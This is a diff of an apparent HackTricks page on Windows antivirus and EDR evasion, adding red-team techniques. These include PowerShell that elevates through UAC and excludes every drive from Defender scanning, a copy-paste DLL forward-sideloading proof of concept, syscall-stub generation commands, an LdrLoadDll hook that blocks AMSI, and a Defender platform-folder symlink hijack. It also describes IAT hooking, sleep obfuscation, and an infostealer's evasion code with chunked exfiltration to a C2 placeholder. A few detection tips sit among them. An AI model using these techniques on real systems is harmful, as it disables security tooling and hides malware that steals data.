@@ -2,13 +2,48 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
+**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
 ## Stop Defender
 
 - [defendnot](https://github.com/es3n1n/defendnot): A tool to stop Windows Defender from working.
 - [no-defender](https://github.com/es3n1n/no-defender): A tool to stop Windows Defender from working faking another AV.
 - [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
+
+### Installer-style UAC bait before tampering with Defender
+
+Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. The flow is simple:
+
+1. Probe for administrative context with `net session`. The command only succeeds when the caller holds admin rights, so a failure indicates the loader is running as a standard user.
+2. Immediately relaunch itself with the `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.
+
+```powershell
+if (-not (net session 2>$null)) {
+    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
+    exit
+}
+```
+
+Victims already believe they are installing “cracked” software, so the prompt is usually accepted, giving the malware the rights it needs to change Defender’s policy.
+
+### Blanket `MpPreference` exclusions for every drive letter
+
+Once elevated, GachiLoader-style chains maximize Defender blind spots instead of disabling the service outright. The loader first kills the GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) and then pushes **extremely broad exclusions** so every user profile, system directory, and removable disk becomes unscannable:
+
+```powershell
+$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
+Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
+$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
+Add-MpPreference -ExclusionExtension '.sys'
+```
+
+Key observations:
+
+- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
+- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
+- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.
+
+Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.
 
 ## **AV Evasion Methodology**
 
@@ -121,6 +156,69 @@ Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the
 > [!TIP]
 > I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.
 
+### Abusing Forwarded Exports (ForwardSideLoading)
+
+Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:
+
+- Load `TargetDll` if not already loaded
+- Resolve `TargetFunc` from it
+
+Key behaviors to understand:
+- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
+- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.
+
+This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.
+
+Example observed on Windows 11:
+
+```
+keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
+```
+
+`NCRYPTPROV.dll` is not a KnownDLL, so it is resolved via normal search order.
+
+PoC (copy-paste):
+1) Copy the signed system DLL to a writable folder
+```
+copy C:\Windows\System32\keyiso.dll C:\test\
+```
+2) Drop a malicious `NCRYPTPROV.dll` in the same folder. A minimal DllMain is enough to get code execution; you do not need to implement the forwarded function to trigger DllMain.
+```c
+// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
+#include <windows.h>
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
+    if (reason == DLL_PROCESS_ATTACH){
+        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
+    }
+    return TRUE;
+}
+```
+3) Trigger the forward with a signed LOLBin:
+```
+rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
+```
+
+Observed behavior:
+- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
+- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
+- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
+- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run
+
+Hunting tips:
+- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
+- You can enumerate forwarded exports with tooling such as:
+```
+dumpbin /exports C:\Windows\System32\keyiso.dll
+# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
+```
+- See the Windows 11 forwarder inventory to search for candidates: https://hexacorn.com/d/apis_fwd.txt
+
+Detection/defense ideas:
+- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
+- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
+- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories
+
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
 `Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
@@ -138,6 +236,33 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 > [!TIP]
 > Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.
+
+## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)
+
+EDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs. To bypass those hooks, you can generate **direct** or **indirect** syscall stubs that load the correct **SSN** (System Service Number) and transition to kernel mode without executing the hooked export entrypoint.
+
+**Invocation options:**
+- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
+- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
+- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.
+
+**Hook-resistant SSN resolution strategies:**
+- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
+- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
+- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
+- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.
+
+Example SysWhispers4 usage:
+```bash
+# Indirect syscalls + hook-resistant resolution
+python syswhispers.py --preset injection --method indirect --resolve recycled
+
+# Resolve SSNs from a clean on-disk ntdll
+python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll
+
+# Hardware breakpoint SSN extraction
+python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
+```
 
 ## AMSI (Anti-Malware Scan Interface)
 
@@ -212,7 +337,43 @@ This technique was initially discovered by [@RastaMouse](https://twitter.com/_Ra
 
 There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
+### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)
+
+AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.
+
+Implementation outline (x64 C/C++ pseudocode):
+```c
+#include <windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
+static pLdrLoadDll realLdrLoadDll;
+
+NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
+    if (module && module->Buffer){
+        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
+        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
+            // Pretend the DLL cannot be found → AMSI never initialises in this process
+            return STATUS_DLL_NOT_FOUND; // 0xC0000135
+        }
+    }
+    return realLdrLoadDll(path, flags, module, handle);
+}
+
+void InstallHook(){
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
+    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
+    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
+}
+```
+Notes
+- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
+- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
+- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).
+
+The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
+The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.
 
 **Remove the detected signature**
 
@@ -511,7 +672,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 ### Compiling our own reverse shell
 
-https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### First C# Revershell
 
@@ -829,15 +990,208 @@ References for PPL and tooling
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
+## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
+
+Windows Defender chooses the platform it runs from by enumerating subfolders under:
+- `C:\ProgramData\Microsoft\Windows Defender\Platform\`
+
+It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.
+
+Preconditions
+- Local Administrator (needed to create directories/symlinks under the Platform folder)
+- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
+- Only built-in tools required (mklink)
+
+Why it works
+- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.
+
+Step-by-step (example)
+1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
+```cmd
+set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
+set DST="C:\TMP\AV"
+robocopy %SRC% %DST% /MIR
+```
+2) Create a higher-version directory symlink inside Platform pointing to your folder:
+```cmd
+mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
+```
+3) Trigger selection (reboot recommended):
+```cmd
+shutdown /r /t 0
+```
+4) Verify MsMpEng.exe (WinDefend) runs from the redirected path:
+```powershell
+Get-Process MsMpEng | Select-Object Id,Path
+# or
+wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
+```
+You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.
+
+Post-exploitation options
+- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
+```cmd
+rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
+```
+
+> [!TIP]
+> Note that This technique does not provide privilege escalation by itself; it requires admin rights.
+
+## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)
+
+Red teams can move runtime evasion out of the C2 implant and into the target module itself by hooking its Import Address Table (IAT) and routing selected APIs through attacker-controlled, position‑independent code (PIC). This generalises evasion beyond the small API surface many kits expose (e.g., CreateProcessA), and extends the same protections to BOFs and post‑exploitation DLLs.
+
+High-level approach
+- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
+- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
+- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
+  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
+  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
+- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.
+
+Why IAT hooking here
+- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
+- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
+- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.
+
+Minimal IAT hook sketch (x64 C/C++ pseudocode)
+```c
+// For each IMAGE_IMPORT_DESCRIPTOR
+//  For each thunk in the IAT
+//    if imported function == "CreateProcessA"
+//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
+// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
+```
+Notes
+- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
+- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
+- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.
+
+Call‑stack spoofing stub
+- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
+- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
+- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.
+
+Operational integration
+- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
+- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.
+
+Detection/DFIR considerations
+- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
+- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
+- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
+- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.
+
+Related building blocks and examples
+- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
+- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
+- PIC call‑stack spoofing stubs (e.g., Draugr)
+
+
+## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)
+
+### Import-time IAT hooks via a resident PICO
+
+If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:
+
+- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
+- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
+- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
+- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.
+
+This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.
+
+### Forcing hookable imports when the target uses PEB-walking
+
+Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:
+
+- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
+- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.
+
+### Ekko-style sleep/idle obfuscation without patching `Sleep()`
+
+Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:
+
+- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
+- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
+- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.
+
+Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.
+
+Detection ideas (telemetry-based)
+- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
+- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
+- Large-range `VirtualProtect` followed by custom per-section permission restoration.
+
+
+## SantaStealer Tradecraft for Fileless Evasion and Credential Theft
+
+SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.
+
+### Keyboard layout gating & sandbox delay
+
+- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
+
+```c
+HKL layouts[64];
+int count = GetKeyboardLayoutList(64, layouts);
+for (int i = 0; i < count; i++) {
+    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
+    if (lang == LANG_RUSSIAN) {
+        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+        ExitProcess(0);
+    }
+}
+Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
+```
+
+### Layered `check_antivm` logic
+
+- Variant A walks the process list, hashes each name with a custom rolling checksum, and compares it against embedded blocklists for debuggers/sandboxes; it repeats the checksum over the computer name and checks working directories such as `C:\analysis`.
+- Variant B inspects system properties (process-count floor, recent uptime), calls `OpenServiceA("VBoxGuest")` to detect VirtualBox additions, and performs timing checks around sleeps to spot single-stepping. Any hit aborts before modules launch.
+
+### Fileless helper + double ChaCha20 reflective loading
+
+- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
+- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
+- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.
+
+
+### Modular in-memory collection & chunked HTTP exfil
+
+- `create_memory_based_log` iterates a global `memory_generators` function-pointer table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.
+- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.
+
 ## References
 
+- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
+- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
+- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
+- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
+- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
+- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
+- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
 - [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
+- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
+- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
 - [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
 - [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
 - [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
+- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
+- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
+- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
+- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
+- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
+- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
+- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
+
 
 {{#include ../banners/hacktricks-training.md}}
